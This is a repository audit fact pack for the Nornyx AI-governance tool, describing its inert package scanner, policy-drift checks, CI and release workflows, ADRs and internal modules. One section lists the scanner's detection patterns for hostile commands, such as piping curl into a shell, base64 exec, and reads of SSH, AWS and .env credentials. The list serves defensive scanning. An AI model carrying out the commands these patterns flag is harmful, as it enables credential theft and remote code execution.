# FACT PACK 04 — Governed Packages, Workspace/Enterprise, CI/CD, Documentation System, Repo Governance

Audited at git HEAD `70d2b40`, package version 1.11.0 (`nornyx/__init__.py:3`, `manifest.json` `"version": "1.11.0"`). Repo root: `/home/user/nornyx`. All paths below are repo-relative unless absolute.

Status labels used throughout: **IMPLEMENTED** (code + tests), **GUIDANCE** (documented workflow, no enforcing code), **ROADMAP** (aspirational), **NON-GOAL** (explicitly disclaimed).

---

## 1. Governed Package Profile — IMPLEMENTED

Sources: `docs/governed-package-profile.md` (354 lines), `schemas/governed_package.schema.json`, `nornyx/governed_package.py` (1,746 lines), `nornyx/package_scanner.py` (1,252 lines), `examples/governed_package/` (12 fixtures), tests in `tests/test_governed_package_profile.py` (34 test functions).

### 1.1 What a governed package is

"An inert declarative contract bundle for controlled work" describing mission scope, tasks, change boundaries, evidence requirements, approval gates, artifacts, safety restrictions, installation policy, locks, and provenance (`docs/governed-package-profile.md:8-13`). Core concepts (lines 40-57): `mission`, `task`, `change`, `evidence_pack`, `evidence_requirement`, `approval_gate`, `risk_tier` (low/medium/high/critical), `agent_assignment`, `execution_surface`, `artifact`, `installation_policy`, `safety_boundary`, `package_lock`, `provenance`. Doctrine sentence worth quoting: "Execution surfaces are tools, not accountable approvers." (line 57).

### 1.2 CLI surface (wired in `nornyx/cli.py:1390-1429`)

| Command | Handler | Behavior |
|---|---|---|
| `nornyx package scan <src> --out <dir> [--package-id]` | `cmd_package_scan` (`cli.py:281`) → `scan_package` (`package_scanner.py:1000`) | Deterministic local scan; writes 10 JSON + 10 Markdown reports (`write_scan_reports`, `package_scanner.py:1215-1252`); prints `{status, out, package_id, risk_tier, total_files_scanned, package_payload_executed: false}` |
| `nornyx package generate <contract.nyx> --out <dir>` | `cmd_package_generate` (`cli.py:227`) → `generate_governed_package` (`governed_package.py:1045`) | Contract-first: generates inert package dir (manifest, markdown contracts, provenance, package lock) |
| `nornyx package validate <path>` | `cmd_package_validate` (`cli.py:239`) → `validate_governed_package_source` (`governed_package.py:1724`) | Accepts a `.nyx` contract, a `package_manifest.json`, or a generated directory; for directories also runs `verify_package_lock` (`governed_package.py:1112`) and `verify_registered_artifact_hashes` (`governed_package.py:1252`) |
| `nornyx package register <src-dir> --contract <c.nyx> --out <dir>` | `cmd_package_register` (`cli.py:256`) → `register_existing_package` (`governed_package.py:1412-1496`) | Artifact-first: inventories + scans the existing dir, hash-locks it, writes `registration_report.json` and `package_lock.json`; raises on validation errors |
| `nornyx package radar <src> [--suggest-contract] --out <path>` | `cmd_package_radar` (`cli.py:268`) → `radar_governed_packages` (`governed_package.py:1557-1721`) | Discovery-first: reuses `scan_package`, emits `radar_report.json` with `proposal_only: true`, candidate packages, suggested evidence/gates, confidence score (0.74 with artifacts / 0.2 without, hardcoded at `governed_package.py:1669,1689`); `--suggest-contract` also writes a suggested `.nyx` |
| `nornyx package evidence import <tool> <report.json> --out <dir>` | `cmd_package_evidence_import` (`cli.py:303-346`) | **Exactly two importers exist**: `syft` and `gitleaks` (`cli.py:305`; `ADAPTER_PARSERS`, `package_scanner.py:817-820`). Any other tool name → exit 1 with `UNSUPPORTED_EVIDENCE_TOOL`. No other importers are implemented. |

Public Python API (`nornyx/__init__.py`): `GovernedPackage`, `GovernedPackageGenerator`, `GovernedPackageValidator`, `generate_governed_package`, `validate_governed_package`, `scan_package` — the governed-package surface is the package's *entire* top-level `__all__`.

### 1.3 Scanner detector categories (from code, `nornyx/package_scanner.py`)

The scanner (`SCANNER_NAME = "nornyx-deterministic-package-scanner"`, version "1.0", line 22-23) is local-only, no network, does not execute or mutate the scanned source. Findings buckets in `scan_package` (line 1017-1024): `hooks`, `mcp`, `secrets`, `endpoints`, `commands`, `scripts`, plus claim-vs-evidence mismatches.

1. **File inventory** (`file_inventory_item`, lines 290-319): path, size, extension, MIME classification, SHA-256, hidden/dotfile, binary-like (NUL-byte heuristic), large file (>5 MiB, line 25), long-line/minified (>2,000 chars/line, line 26). Read errors are recorded, not fatal (lines 293-302). Skips `.git`, `__pycache__`, `node_modules`, `.venv`, etc. and symlinks (lines 27, 189).
2. **Secret-like patterns** (`SECRET_PATTERNS`, lines 33-42): `aws_access_key_id` (AKIA…), `github_token` (`gh[pousr]_…`), `openai_key` (`sk-…`), `anthropic_key` (`sk-ant-…`), `private_key` / `ssh_private_key` (PEM headers, severity critical), `bearer_token`, `generic_secret_assignment` (key/token/secret/password = value). Plus credential-named files (`SECRET_FILE_NAMES`, lines 43-52: `.env`, `credentials.json`, `id_rsa`, …).
3. **Hooks** (`detect_hooks`, lines 489-542): hook paths (`hooks/`, `.claude/hooks`, `.git/hooks`, `pre-commit`, `preinstall`, `postinstall`, …, line 63-65) and hook-content keywords (`on_save`, `on_start`, `pre-push`, …, line 66).
4. **MCP server definitions** (`detect_mcp`, lines 545-593): `mcpServers`/`mcp_servers`/`modelcontextprotocol` keys or `npx|uvx|python… mcp` commands; escalates severity for broad filesystem paths (`/`, `~`, `$HOME`, `C:\`, `/etc` — `BROAD_PATH_RE`, lines 73-87 → critical), filesystem access, browser/network access, database access.
5. **Endpoints** (`detect_endpoints`, lines 448-486): URLs, domains (TLD allowlist, line 56-59), valid IPs, localhost ports; classified (`classify_endpoint`, lines 425-437) as `webhook_callback` / `execution` (curl|sh) / `upload_write` / `download` / `unknown` / `informational`.
6. **Dangerous commands** (`DANGEROUS_COMMAND_PATTERNS`, lines 92-116, 23 patterns): `rm -rf` (critical), `sudo`, `chmod +x`, `chown`, `curl|sh` / `wget|sh` (critical), encoded PowerShell (critical), `eval(`/`exec(`, `os.system`, `subprocess.*`, `child_process.*`, base64-pipe-exec (critical), `npm install` without `--ignore-scripts`, `pip install <url>`, privileged Docker (critical), `kubectl apply/delete/replace/patch`, `terraform apply/destroy` (critical), git credentials, `~/.ssh` / `~/.aws` / `.env` reads, curl/wget uploads. Each carries a fixed severity and a remediation recommendation string.
7. **Scripts** (`detect_scripts`, lines 596-657): shell extensions (`.sh`, `.ps1`, `.bat`, …), setup/install/bootstrap-named files, and `package.json` lifecycle scripts (`preinstall`, `install`, `postinstall`, `prepare`, `prepublish`, `prepack`).
8. **Claim-vs-evidence** (`collect_claims` lines 672-688, `detect_claim_mismatches` lines 691-728): README/manifest text is parsed for claims (`docs_only`, `no_network`, `no_execution`, `no_secrets`, `template_only`, `local_only`, lines 660-669) and every claim source is labeled `untrusted_claim` (lines 681-686). Six mismatch checks: docs-only-but-risk-surfaces (critical), no-network-but-endpoints (high), no-execution-but-scripts (critical), no-secrets-but-secret-patterns (high), template-only-but-executables (high), local-only-but-remote-endpoints (high).
9. **Structured-file validity**: JSON/YAML files that fail to parse are recorded in `summary.invalid_structured_files` (lines 1045-1052).

**Risk scoring** (`risk_tier` lines 731-741, and lines 1128-1129): tier = max observed severity (critical/high/medium/low); score = sum of severity ranks (info 0 … critical 4) — deterministic and explainable, with an `explanations` list (lines 1130-1144).

### 1.4 Redaction behavior — IMPLEMENTED

`sanitize_excerpt` (`package_scanner.py:234-241`) rewrites every secret pattern match to `REDACTED_SECRET_LIKE_VALUE` and truncates excerpts to 160 chars. Secret findings hardcode `"raw_value_stored": False` and `"evidence": "REDACTED_SECRET_LIKE_VALUE"` (lines 376, 404-405). The top-level report asserts `safety_boundary.raw_secret_values_stored: false` (line 1195). Docs promise: "Raw secret values are not stored in reports" (`docs/governed-package-profile.md:100-101`).

### 1.5 Evidence records and report contents

Every finding is normalized into an evidence record (`evidence_record`, lines 244-287) with fields: `evidence_id` (stable hash-derived), `evidence_type`, `source` (`built_in_scanner` | `external_adapter`), `source_tool`, `severity`, `confidence`, `status` (`observed` | `imported`), `raw_secret_stored`, `sanitized_evidence`, `hash`, `requires_human_review`, `recommendation`, `deterministic`, `network_used`, `execution_used`. The full scan report (`scan_package` return, lines 1147-1199) includes: scanner identity block (with `deterministic: true`, `network_used: false`, `package_payload_executed: false`), summary, file inventory, findings per bucket, claim-vs-evidence, `evidence_records`, `risk_surface` (tier/score/explanations), external-evidence summary, adapter execution report, and a `safety_boundary` block asserting hooks not activated and MCP servers not started (lines 1192-1198).

Generated artifacts of `package generate` (enumerated at `docs/governed-package-profile.md:253-278` and matching `write_scan_reports`, `package_scanner.py:1220-1247`): `package_manifest.json`, `package_lock.json`, `AGENTS.md`, `evidence_contract.md`, `approval_contract.md`, `safety_boundary.md`, `provenance.json`, and 10 JSON + 10 MD scanner reports (analysis, risk surface, source inventory, hook/MCP/secret/endpoint/command reviews, claim-vs-evidence, external evidence summary, adapter execution report). Register mode adds `registration_report.json`; the register lock binds source hashes, generated-report hashes, registered artifact hashes, scanner report hash, and manifest hash (`governed_package.py:1475-1495`).

### 1.6 External evidence adapters — IMPLEMENTED, import-only

`run_external_adapters` (`package_scanner.py:846-936`): adapters declared under `governed_package.evidence_adapters` in `.nyx` are **never executed by Nornyx**. If a `report_path` is configured, the file is parsed (Syft SBOM → `sbom_component` info records; Gitleaks → redacted `secret_scan` records, lines 749-814); otherwise status is `unavailable` with detail "external tools are not executed automatically; provide report_path to import evidence" (line 902), and even when the tool binary is on PATH: "command is available but not executed by Nornyx" (line 904). Network-mode adapters require explicit `allow_network` (lines 879-881). Required adapters default to `failure_policy: fail` (line 862); a missing required adapter yields an error diagnostic and overall `status: fail` (lines 919-935). Every adapter execution record hardcodes `package_payload_executed: False` (line 916). Imported records set `execution_used: True` (the external scanner ran) but `network_used: False`, and docs stress imports "do not imply that package payloads were executed" (`docs/governed-package-profile.md:138-140`).

### 1.7 Validation rules — IMPLEMENTED (fail-closed safety flags)

`validate_governed_package` (`governed_package.py:536-…`). Documented failure list at `docs/governed-package-profile.md:280-303` and enforced in code: required fields; gates without evidence; gates referencing unknown evidence; execution surface or AI tool as approver; `can_approve: true` on a surface; `installed: true`; `executable_by_default: true`; `requires_explicit_install: false`; any permissive safety flag (secrets/production data/autonomous execution/external writes/deployment); missing approval requirement; artifacts missing id/path/type; registered artifacts missing sha256; missing provenance fields; lock hash mismatches; **scan-conditional requirements** — hooks detected without hook risk review evidence, MCP without MCP review, secrets without secret-scan evidence, critical claim mismatches without claim review, required adapter unavailable with `failure_policy: fail`, critical external evidence without a security approval gate. The required inert defaults are fixed constants (`SAFE_INSTALLATION_POLICY`, `SAFE_BOUNDARY`, used at `governed_package.py:1690-1691`).

Fixtures exercising both directions: `examples/governed_package/basic.nyx`, `register_existing.nyx`, `software_change.nyx`, `external_evidence_adapters.nyx`, negative fixtures `invalid_ai_tool_approver.nyx` and `invalid_unsafe_flags.nyx`, plus scanner corpora `claim_mismatch_package/`, `package_with_hooks/`, `package_with_mcp_config/`, `safe_docs_only_package/`, `suspicious_setup_script/`, `radar_sample_repo/` with `radar_expected_report.json`.

### 1.8 Explicit non-claims — NON-GOALS (documented and code-asserted)

`docs/governed-package-profile.md:27-38`: does not execute packages, does not install, does not approve work, does not deploy, does not store secrets, does not operate runtime systems, does not start MCP servers, does not activate hooks, does not call external network by default, **"Does not claim that a package is safe."** The permitted claim is scoped precisely (lines 146-148): "Nornyx may claim that a package was inventoried, risk-surfaced, evidence-bound, hash-locked, and approval-gated. It must not claim that the package is safe." The generated `package_analysis.md` prints exactly that statement (`package_scanner.py:983`).

---

## 2. Workspace / Multi-Repo Governance — IMPLEMENTED

Sources: `nornyx/workspace.py` (359 lines), `nornyx/cli.py:358-374, 1441-1456`, `tests/test_workspace.py` (15 tests), `docs/USE_IN_YOUR_REPO.md:101-157`, `docs/CASE_STUDY_multi_repo_governance.md` (read fully).

### 2.1 What it checks

Module docstring (`workspace.py:1-17`): a single `.nyx` is the source of truth *within* one repo, but Nornyx had "no notion of a policy that lives *above* repos." The workspace layer: a `nornyx.workspace.yaml` manifest declares canonical policies once and lists member contracts; `check_workspace` (`workspace.py:218-299`) verifies **every member's named policy matches the canonical rule set** (set comparison of normalized `deny`/`require` rules via `normalize_policy_rules` from `policy_runtime`). Per-member per-policy statuses: `ok`, `missing` (member doesn't declare the policy), `drift` (with sorted `missing`/`extra` rule lists), `contract_missing`, `synced`. Manifest and member paths are screened by the governance path-security loader (`inspect_local_file`, `reject_remote_or_device_path` — `workspace.py:43-61, 227-239`); local files only, no network.

### 2.2 Sync mode (`--write`)

`sync_policy_in_contract` (`workspace.py:99-215`) surgically rewrites only the matched policy's rule block (removing `rules:`/`deny:`/`require:` sub-blocks, writing one canonical `rules:` block) and preserves comments and other blocks. It deliberately does **not** invent missing policy blocks or missing files — those stay reported as drift for a human (`workspace.py:222-225`). Exit code: 0 for `pass`/`synced`, 1 on drift, 2 on manifest error (`cli.py:363,374`). Report schema: `nornyx.workspace_report.v0.1` (`workspace.py:30`).

### 2.3 Manifest format (textbook-quotable — from `docs/USE_IN_YOUR_REPO.md:101-111` and `tests/test_workspace.py:9-19`)

```yaml
# nornyx.workspace.yaml
workspace: AcmeOrg
policies:
  SafeDeliveryPolicy:
    - deny secrets_to_llm
    - require tests_if_code_changed
    - require human_approval_before_merge
members:
  - path: service-a/nornyx.nyx
  - path: service-b/nornyx.nyx
```

### 2.4 Case study (`docs/CASE_STUDY_multi_repo_governance.md`) — dogfooding narrative, factual for the book

An adversarial two-repo test (GovFlags + NotifySvc sharing `SafeDeliveryPolicy`) plus a cold-start trial found **three real bugs** across v1.1.5→v1.1.9:
- **Bug 1** — cross-repo blind spot: both repos' own drift gates stayed green while the shared policy silently diverged (no org-level check existed).
- **Bug 2** — Nornyx's *own recommended gate* in `USE_IN_YOUR_REPO.md` diffed only `AGENTS.md`, which doesn't render policy rules, so a `policy.yaml` change passed green ("false sense of safety").
- **Bug 3** — sync `--write` no-opped on the exact YAML block-sequence indentation `nornyx init` emits (found only by the cold-start trial); fixed v1.1.9 with regression tests for both indentation forms.
Fixes shipped in the open: `nornyx drift` full-output gate + `workspace-check` (v1.1.6), `--write` sync (v1.1.7). Explicit design NON-GOAL (lines 58-61): no language-level `policy-ref` above repos — it would reopen the frozen v1.0 schema and sacrifice face-auditable contracts. (Note: a *within-repo* `policy_ref` does exist since v1.3.0 — `RELEASE_NOTES_v1.3.0.md`, `tests/test_policy_ref.py`.)

### 2.5 Related within-repo drift gate

`nornyx drift <contract> --out <dir>` (`nornyx/repo_drift.py`, docstring lines 1-9; `cmd_drift`, `cli.py:349-355`; `tests/test_repo_drift.py`): regenerates the contract to a temp dir and compares the **entire** generated artifact set by SHA-256 against the committed output; any added/removed/changed artifact is drift (exit 1). Report schema `nornyx.repo_drift_report.v0.1`.

---

## 3. CI/CD, Releases, Assurance Gates

### 3.1 Workflows (`.github/workflows/`, 4 files)

**`ci.yml`** — on push/PR to main; `permissions: contents: read`. Jobs:
- `test`: Python 3.10–3.13 matrix; verifies checked-out SHA equals the PR head SHA ("Verify exact candidate identity", lines 141-144); pytest; `git diff --check` whitespace hygiene against the live PR base; `python -m build` + `twine check`; **installed-wheel no-network smoke** (`scripts/test_wheel_install.py`); checks the bundled example contract `examples/governed_delivery_control_plane.nyx`.
- `adapter-foundation` (3.10–3.13): builds the core wheel *from the same commit* (never PyPI) and tests `adapters/nornyx-agentic-adapters` against it (per ADR-0039 M2-A comment, lines 171-175).
- `adapter-crewai-native`: real pinned `crewai==1.15.4`, junit-XML parsing that **fails closed if any test skipped**, and a wheel smoke that monkeypatches `socket.connect` to assert zero network use (lines 300-358).
- `adapter-langgraph-native`: exact `langgraph==1.2.2`, same no-skip discipline.
- `crewai-governance-benchmark`: runs `examples/crewai_governance_benchmark/benchmark.py` offline and asserts its own output contract (verdict must be GO, evidence validation pass, zero diagnostics).
- `quality`: ruff; `scripts/check-public-boundary.py` (public-boundary marker scan); `scripts/check_compatibility_migrations.py`; `scripts/agentic_network_ci.py` (the reference agentic-network CI demonstration — includes a generated-artifact **byte-compare drift gate**, step 5 of `docs/agentic-network/11_REFERENCE_CI.md`).
- `native-frameworks`: native CrewAI/LangGraph integration tests plus an A/B comparison whose artifacts are machine-checked, and an isolated verification that installs published nornyx 1.7.0 from PyPI.
- `windows`: full test + build + wheel smoke on `windows-latest`.

**`release.yml`** — PyPI **Trusted Publishing (OIDC), no API token** (header comment, lines 672-677). Publish fires only on a published GitHub Release whose tag matches `^v[0-9]+\.[0-9]+\.[0-9]+$` exactly (positive eligibility gate, `check-core-tag` job); `workflow_dispatch` runs tests only and "is correctly excluded from ever setting eligible=true". Publish job uses GitHub Environment `pypi` with `id-token: write`.

**`adapters-release.yml`** — separate cadence for `nornyx-agentic-adapters`; tag must match `adapters-vX.Y.Z` **and** that version must equal the adapter's `pyproject.toml` version at the tagged commit — "a tag/version mismatch … fails closed rather than publishing" (lines 4-13). Uses environment `pypi-adapters`. The workflow "never creates, moves, or repairs tags."

**`nornyx-safe-dev-quality.yml`** — maintainer-run, `workflow_dispatch` only: pytest, PMO status audit, goal scaffold dry-run, handoff export dry-run, two example checks.

There is also a `tests/test_release_workflow_policy.py` test file, i.e. the release workflow's own policy is under test — IMPLEMENTED.

### 3.2 Release process (`RELEASING.md`, 80 lines)

- Version bumped in **seven equality-enforced locations** (pyproject, `__init__`, `manifest.json`, `docs/VERSIONING.md`, README pin, two test fixtures), collectively enforced by four named test files (`RELEASING.md:10-24`).
- Tag `vX.Y.Z` + `gh release create` triggers publish; the `pypi` environment can require a human reviewer, "matches Nornyx's own 'human approval before release' posture" (lines 78-81).
- Rules that bite (lines 61-69): PyPI versions immutable; "Let CI build the artifact" — no manual `twine upload`; package version independent of language/schema version (still 1.0).

### 3.3 Makefile and manifest.json

`Makefile`: six phony targets only — `install`, `test`, `check`, `generate`, `context`, `evidence` (all thin wrappers over pip/pytest/nornyx CLI on the flagship example).
`manifest.json`: machine-readable repo metadata — project, category ("AI Engineering Control-Plane Language"), version 1.11.0, `language_version: "1.0.0"`, status ("Authorizer state SPI 1.2 implemented and validated"), source-of-truth file list, canonical command strings, roadmap model v0.2–v1.0, safety boundaries ("No arbitrary shell execution by default", "No live LLM calls in v0.1 scaffold", "No production deployment", "No credential storage", "No autonomous self-modification"), and a `current_validation` block dated 2026-08-01. Kept fresh by `tests/test_manifest_metadata.py`.

### 3.4 Release notes v1.2.0–v1.5.2 (root)

- v1.2.0: first community-contribution release (all features by @hass-nation): `nornyx --version` etc.
- v1.3.0: within-repo `policy_ref` (reference one canonical policy definition instead of copying).
- v1.4.0: Governed Package Profile introduced.
- v1.5.0: deterministic inert package scanner ("governed package hardening").
- v1.5.1: governance hardening hotfix — raw-path symlink enforcement (3 post-release findings).
- v1.5.2: completes explicit-profile ancestor symlink enforcement.
Later formal release records live in `docs/releases/` (`RELEASE_CANDIDATE_GOVERNANCE_PROGRAM.md`, `RELEASE_CANDIDATE_v1_0.md`, `RELEASE_NOTES_v1_0.md`, `RELEASE_RECORD_v1_0.md`).

### 3.5 `REPLACEMENT_BASELINE_README.md`

Internal housekeeping record: documents what was cleaned/kept when the pre-development repo was replaced by this baseline (removed old React/Vite portal, node_modules, egg-info; kept source, tests, docs, the lightweight `apps/nornyx-dev-pmo-portal/`), plus post-extraction validation commands and the first four goals (GOAL-000 … GOAL-003). Classify as **internal planning/history**, not product doc.

---

## 4. Repo Self-Governance

### 4.1 Does the repo govern itself with a `.nyx`?

**No root `nornyx.nyx` and no `.nornyx/` committed output directory exist** (verified by filesystem search). The repo's self-governance is *indirect*:
- CI checks the flagship bundled contract `examples/governed_delivery_control_plane.nyx` on every run (`ci.yml`, "Check a bundled example contract") and `scripts/agent/run-nornyx-validation-gates.sh` checks four example contracts and generates a goal plan.
- The `quality` job runs `scripts/agentic_network_ci.py`, which internally executes a generate→regenerate→byte-compare drift gate on the agentic-network support example (`docs/agentic-network/11_REFERENCE_CI.md`, step 5).
- The `nornyx drift`-on-own-contract pattern that `docs/USE_IN_YOUR_REPO.md:62-90` recommends to adopters is **not** applied to the Nornyx repo itself (there is no committed `.nornyx/` to gate). Self-consistency is instead enforced by tests: `test_documentation_consistency.py`, `test_manifest_metadata.py`, `test_readme_commands.py`, `test_status_date_freshness.py`, `test_pmo_status_consistency.py`, `test_public_boundary.py`, `test_release_workflow_policy.py`.

### 4.2 `AGENTS.md` (root, 35 lines)

Role guidance for four AI agent roles — Architect ("Do not expand v0.1 into a general-purpose language runtime"), Builder (run pytest; check the flagship example after checker changes; "Avoid arbitrary command execution features unless guarded by explicit capability design"), Reviewer ("Reject changes that weaken policy, evidence, or approval semantics"), Security ("Treat context poisoning, prompt injection, tool misuse, dependency risk, and self-modification as first-class threats"; "Do not allow untrusted context to define policy or permissions"). Output contract for AI-assisted patches: changed files, test result, risk note, evidence note, whether approval is required.

### 4.3 `CODEX_GOAL.md` (root, 1,326 lines) — INTERNAL PLANNING

An execution goal ledger addressed to Codex ("Codex must read this file in full before beginning implementation"): the authoritative brief for completing the governance-extension program, defining roles (principal architect, adversarial auditor, release reviewer), and a required final verdict of exactly one of `PROGRAM COMPLETE — READY FOR HUMAN RELEASE REVIEW` / `PROGRAM INCOMPLETE` / `PROGRAM BLOCKED`, with "Do not authorize a release until the final independent audit returns GO." Classify strictly as internal development planning, not product documentation.

### 4.4 Documentation system directories

- `docs/ADRs/` — 2 ADRs: **ADR-0001** "Nornyx Starts as a Control-Plane Language" (accepted for v0.1; rejects general-purpose-language scope); **ADR-0021** "Zero-Friction Adoption Ramp" (proposed; lowering adoption friction). Note the numbering collision with `docs/decisions/ADR-0021` (different subject) — see Unverified/ambiguous.
- `docs/decisions/` — 33 ADRs, ADR-0010 … ADR-0042 (one-liners):
  - 0010 product thesis & boundary discipline; 0011 first-class delivery state + renderers; 0012 portal *contract*, not portal engine; 0013 AI folklore → engineering patterns (pattern lifecycle); 0014 Evergreen Assurance Model; 0015 product-to-ops lifecycle as optional extension (roadmap material); 0016 handover contracts & ambiguity controls; 0017 decision boundary & evidence quality; 0018 requirement triage matrix (every concept classified); 0019 agent requirement discovery workflow; 0020 authoring assistant roadmap (backlog, not core);
  - 0021 change governance as a reusable module (`nornyx.change.v1`); 0022 single profile + additive modules composition; 0023 closed declarative rule language (closed operators, bounded path grammar); 0024 local-only governance discovery (no URLs/network); 0025 normalized approval contract; 0026 profile pack v1 supersedes v0.3 (frozen legacy + loss/provenance report); 0027 deterministic integrity & locking (time-free locks, canonical JSON hashing); 0028 bounded governance block schemas; 0029 fixed structural governance checks (versioned check-ID catalog, checks in reviewed code); 0030 architecture evidence & radar boundary (Nornyx owns a neutral report envelope; specialist tools run outside Nornyx); 0031 specialist governance placement after GSA (`nornyx governance analyze` does not exist — confirmed in `docs/GOVERNANCE_CLI_AND_API.md:10-11`); 0032 verifiable effective approvals (three representations: legacy v1 view, verifiable v2, effective envelope);
  - 0033–0038 agentic-network program: optional `agentic_network` profile; static delegation/handoff relations; deterministic artifacts + network lock + `nornyx agentic-network` CLI; runtime-event evidence ingestion (`agentic_evidence.py`, evidence-validate); optional cross-framework reference adapters in non-wheel `integrations/`; end-to-end product proof & external-evaluation boundaries;
  - 0039 the supported `nornyx.agentic` authorization SPI + distributable `nornyx-agentic-adapters` package; 0040 **governance assurance tiers and claim boundaries** (three tiers; "The word 'guarantee' is deliberately avoided"); 0041 EvidenceRecorder integrity & serialization (validates caller-controlled values before they influence recorder state); 0042 framework-neutral runtime occurrence semantics.
- `docs/RFCs/` — 3: **RFC-0001** core language (v0.1 YAML-compatible source + CLI); **RFC-0002** formal grammar & schema model (accepted for GOAL-004, v0.2 model layer); **RFC-0003** full language evolution research ("Research only. This RFC does not approve public syntax, parser behavior, checker semantics, runtime execution…").
- `docs/goals/` — 66 goal files, `goal-000-…` through `goal-063-…` (green baseline → spec freeze → hardening → runtimes → v0.x maturity bands → v1.0 release train → post-1.0.1 hygiene → graph demo expansion). Internal PMO planning.
- `docs/pmo/status/` — per-goal status dirs GOAL-000… plus `current_status.json` (machine-checked by `tests/test_pmo_status_consistency.py`, `test_status_date_freshness.py`).
- `docs/qa/evidence/` — per-goal QA evidence directories (referenced by the `.agents` skills' rule "Record evidence under `docs/qa/evidence/<GOAL-ID>/`").
- `docs/backlog/` — YAML backlogs (authoring assistant, decision boundary, handover, product-to-ops, requirement triage, zero-friction adoption) + `triage-candidates/`.
- `docs/planning/` — `agentic-network/`, `governance-extension/` program plans. `docs/metrics/NORNYX_KPI_MODEL.md`. `docs/releases/` (see 3.4).

### 4.5 `.agents/`, `.vscode`, `.gitattributes`

- `.agents/skills/` — six repo-local agent skills: `nornyx-artifact-generator`, `nornyx-evidence-pack`, `nornyx-goal-planning`, `nornyx-parser-checker`, `nornyx-security-review`, `nornyx-spec-rfc`. Each `SKILL.md` embeds safe operating rules (e.g. security-review: "Do not enable external connectors or MCP servers… Require human approval for syntax, security, dependency, release, or connector changes").
- `.vscode/tasks.json` — four tasks: quality fast profile, PMO status audit, mission example check, goal scaffold dry-run.
- `.gitattributes` — marks fixture/example JSON as `-text` (byte-stable, no EOL normalization) and the starter-golden `.nyx` fixtures as `binary` — evidence-integrity discipline for hash-bound fixtures.

---

## 5. Runtime-ish Modules — one-by-one (guards against overclaiming)

Framing authority: `docs/02_ARCHITECTURE.md:16-19` — "Their names may include `runtime`, `adapter`, or `connector` for historical reasons, but they do not turn Nornyx into an autonomous execution engine." Public/stable surface per `docs/GOVERNANCE_CLI_AND_API.md` is `nornyx.governance.__all__` plus the six top-level names in `nornyx/__init__.py`; everything else below is **internal/experimental** unless noted. (`docs/public-boundary-policy.md` is about *content* boundaries — no private downstream names in the public repo — not API stability.)

| Module | What it actually does | Surface |
|---|---|---|
| `harness_runtime.py` (385) | `run_harness`: produces bounded harness *plans and reports* from a `.nyx` doc; per `02_ARCHITECTURE.md:28-29` "it does not run arbitrary project commands." | Internal; CLI-exposed |
| `policy_runtime.py` (465) | `evaluate_harness_policy` / `write_policy_report`: static policy evaluation of a document/harness; also provides `normalize_policy_rules` reused by workspace checks. | Internal; CLI-exposed |
| `eval_runtime.py` (513) | `evaluate_document_evals` / `write_eval_report`: threshold + dataset-integrity validation over declared evals and imported results (`eval_runtime` pairs with `eval_import.py` for promptfoo-style imports); no model calls. | Internal; CLI-exposed |
| `trace_runtime.py` (92) | Deterministic trace IDs/events, trace bundles + digests (canonical-JSON hashing). No live tracing. | Internal |
| `bounded_execution.py` (211) | `build_bounded_execution_readiness_report`: v0.8 readiness *report generator* from declared experimental flags — a plan document, not an executor. | Internal |
| `connector_runtime.py` (815) | `build_connector_report` / `build_adapter_conformance_report`: validates connector/adapter *declarations* and readiness metadata; per `02_ARCHITECTURE.md` adapter/connector modules "validate declarations"; no MCP/A2A connections opened. | Internal |
| `evergreen.py` (157) | Evergreen Assurance validators; docstring: "local/read-only validation only. It does not call LLMs, networks, connectors, GitHub, shells, or production systems." | Internal |
| `doctor.py` (53) | `run_doctor`: small local repo diagnosis (find repo root, report). | Internal; CLI-exposed |
| `adoption.py` (284) | Zero-friction adoption helpers: `detect_repo_signals`, adoption status; docstring: "intentionally local and deterministic." | Internal; CLI-exposed |
| `explain.py` (69) | `explain_document`: human-readable explanation of a contract/symbol. | Internal; CLI-exposed |
| `fmt.py` (26) | Canonical v0.1 formatter (stable, diff-friendly YAML output). | Internal; CLI-exposed |
| `editor_tools.py` (304) | Editor/LSP-adjacent JSON payloads (symbols, completions-style data) written to files; not a live LSP server. | Internal |
| `renderers.py` (123) | Read-only delivery-state renderers (shell/Markdown/compact JSON); "They do not execute work." | Internal |
| `kpi_metrics.py` (250) | KPI measurement + evidence scoring; "local/read-only… no LLMs, connectors, networks, GitHub, deployment tools." | Internal |
| `goals.py` (59) | `write_goal_plan`: goal plans "that Codex, Claude Code, Cursor, Copilot, or humans can execute safely." | Internal; CLI-exposed (`goal-plan`) |
| `patterns.py` (97) | AI Pattern Lifecycle validation (ADR-0013); "pure/local validation only." | Internal |
| `handover.py` (183) | Handover & ambiguity-control validators (ADR-0016); local/read-only. | Internal |
| `portal_contract.py` (101) | Validates/normalizes portal-contract dicts (ADR-0012); "does not render a full portal or execute work." | Internal |
| `product_lifecycle.py` (93) | Product-to-ops lifecycle extension validation; "roadmap/backlog validation only." | Internal |
| `regulated_controls.py` (207) | Decision-boundary and evidence-quality contract validation (ADR-0017); "does not enforce runtime policy." | Internal |
| `release_readiness.py` (609) | Builds release-readiness / RC-stabilization / stable-language *reports* (reads versions from pyproject/init). | Internal |
| `requirement_triage.py` (144) | Validates/summarizes the requirement triage matrix (ADR-0018); local/read-only. | Internal |
| `authoring_assistant.py` (169) | Validates the authoring-assistant *roadmap*; "does not call LLMs, host models, run a portal, write .nyx, call connectors, or approve drafts." | Internal |
| `language_evolution.py` (220) | "Research-only": builds local research metadata; "does not change parser or checker behavior… or approve public syntax" (RFC-0003). | Internal |
| `dev_quality.py` (145) | Safe developer-quality utilities incl. `audit_pmo_status`; "pure/local utilities only." | Internal |
| `triage_candidates.py` (199) | Validates agent-discovered requirement candidates (ADR-0019); local/read-only. | Internal |
| Self-healing | `examples/self_healing.nyx` only — a *contract example* (category `experimental_governed_self_healing`, constitution: "healing_is_proposal_first", "production_change_requires_approval", "rollback_must_be_available"). No self-healing runtime module exists. | Example only; matrix labels healing "Experimental" |

All of these carry explicit no-LLM/no-network/no-shell docstrings or equivalent architecture-doc statements — a consistent pattern the book can cite as the "inert-by-default" module discipline.

---

## 6. Numbered Docs — summaries + normative vs aspirational

| Doc | Summary | Classification |
|---|---|---|
| `docs/00_EXECUTIVE_OVERVIEW.md` (38) | Thesis: the missing layer in AI delivery is a safe, executable control plane for intent/context/agents/policies/evals/evidence (16-item list). "v0.1 is not a full general-purpose programming language." | Normative positioning |
| `docs/02_ARCHITECTURE.md` (91) | The implemented processing path: `.nyx → safe parser → hard-coded checker → optional profile/module composition + closed rules → deterministic generator`. Explicitly disclaims that "runtime"-named modules make Nornyx an execution engine. Lists the contract-only module surface. | **Normative** — the single most accurate architecture statement; quote it to bound claims |
